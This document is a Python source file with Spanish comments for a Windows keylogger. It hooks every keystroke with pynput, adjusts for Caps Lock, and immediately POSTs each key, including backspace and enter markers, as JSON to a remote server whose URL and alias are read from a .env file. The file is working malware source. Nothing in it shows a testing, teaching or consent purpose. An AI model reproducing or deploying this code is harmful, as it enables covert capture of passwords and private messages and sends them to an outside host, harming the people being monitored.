from pynput import keyboard
import requests
import ctypes

import decouple
import sys
from class_errors import ErrorPersonalizado

import json
import requests

MESSAGE = ""

try:
    alias = decouple.config("ALIAS",default=None)
    URL = decouple.config("SERVER_URL",default=None)
    if(alias is None):
        raise ErrorPersonalizado("No hay un 'ALIAS' en la variable de entorno .env")
    
    elif(URL is None):
        raise ErrorPersonalizado("No hay un 'SERVER_URL' en la variable de entorno .env")

except ErrorPersonalizado as e:
    print("Error personalizado: ",e.mensaje)
    sys.exit(1)

except decouple.UndefinedValueError as e:
    raise ErrorPersonalizado("La variable de entorno que intentas obtener no existe")

def sendMessage():
    global MESSAGE  # acceder a la variable global message

    data = {"message": MESSAGE,"alias":alias}
    

    json_data = json.dumps(data)# Convertir el diccionario a una cadena JSON

    
    # Enviar la solicitud POST con la cadena JSON como datos
    try:
        response = requests.post(URL, data=json_data, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        if response.status_code == 200:
            print("Pulsacion enviada correctamente")
            print(response.json())

        else:
            print("Error en la solicitud")

        MESSAGE = "" 
    except requests.exceptions.ConnectionError as e:
        print("Error al conectar con el servidor")
    except requests.exceptions.HTTPError as e:
        print("HTTP error al hacer la solicutud")
    except requests.exceptions.RequestException as e:
        print("Error al enviar la solcitud desde el cliente python")

   
    
    
def getUpperCaseOn(): #Funcion para saber si esta encendida la tecla de encendido
    return ctypes.windll.user32.GetKeyState(0x14) & 0xFFFF != 0

     

def onpress_key(key):
    global MESSAGE  # Usamos la variable global MESSAGE
    try:
        if isinstance(key, keyboard.KeyCode):
            char = key.char
            is_upper = getUpperCaseOn()  # Almacenamos un True o un False

            if char is not None and (char.isalnum() or char in "!@#$%^&*()_+{}[];:'\"<>?,./\\|"):
                MESSAGE = char.lower() if char.isalnum() else char  # Convertimos a minúscula si es alfanumérico
                MESSAGE = MESSAGE.upper() if is_upper else MESSAGE  # Convertimos a mayúscula si está activado el bloqueo

            else:
                MESSAGE = ""

        elif key == keyboard.Key.space:  # Manejamos la tecla espacio
            MESSAGE = " "

        elif key == keyboard.Key.backspace:  # Manejamos la tecla de borrar enviando un mensaje que entenderá el servidor
            MESSAGE = "<delete>"

        elif key == keyboard.Key.enter:  # Enviamos un salto de línea cuando es enteer
            MESSAGE = "\n"

        sendMessage()  # En esta función enviamos el mensaje al servidor

    except AttributeError:
        print("Especial Character:", key)




# Usar 'with' para asegurar que el listener se detenga adecuadamente
with keyboard.Listener(on_press=onpress_key) as listener:
    listener.join()
